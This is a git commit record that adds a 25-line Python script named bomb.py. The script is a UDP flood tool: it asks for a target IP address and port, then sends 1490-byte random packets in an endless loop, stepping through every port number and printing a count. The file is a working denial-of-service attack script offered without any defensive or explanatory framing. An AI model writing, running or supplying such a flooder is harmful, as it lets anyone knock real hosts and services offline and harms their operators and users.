ce4099e54f15bc96e5fc150075b6cff2e0e44cc6
rff ald <117867334+xiv3r@users.noreply.github.com>
2025-08-19 17:49:04 +0800

    Create bomb.py

---
+++ bomb.py
@@ -0,0 +1,25 @@
+import sys
+import os
+import time
+import socket
+import random
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system("clear")
+ip = input("IP Target : ")
+port = int(input("Port       : "))
+sent = 0
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1
+    port = port + 1
+    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
+    if port == 65534:
+        port = 1
